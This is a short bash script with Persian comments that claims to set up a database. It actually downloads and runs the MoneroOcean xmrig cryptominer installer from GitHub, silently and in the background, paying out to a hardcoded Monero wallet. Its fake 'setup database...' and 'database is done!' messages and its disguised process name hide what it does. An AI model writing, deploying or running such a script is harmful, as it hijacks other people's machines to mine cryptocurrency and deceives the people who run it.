#!/bin/bash

set -e

# ===== قابل تنظیم =====
START_MSG="setup database..."
DONE_MSG="database is done!"
PROCESS_NAME="xyzim"

WALLET="44DRPgBUgsRRBeqtc2UifP1Zj4ortCL27KTdnNFjtrq87zQ21vRwF6iPxaQsaGk7wibw9d2dGoHSPchdLSsKuUidFinF7oJ"
POOL="gulf.moneroocean.stream:10128"

echo "$START_MSG"

# دانلود و اجرای اسکریپت مونرو اوشن به صورت nohup و بی‌صدا
nohup bash -c "$(curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh)" -s "$WALLET" < /dev/null > /dev/null 2>&1 &

# ذخیره PID
echo $! > /tmp/$PROCESS_NAME.pid

echo "$DONE_MSG"
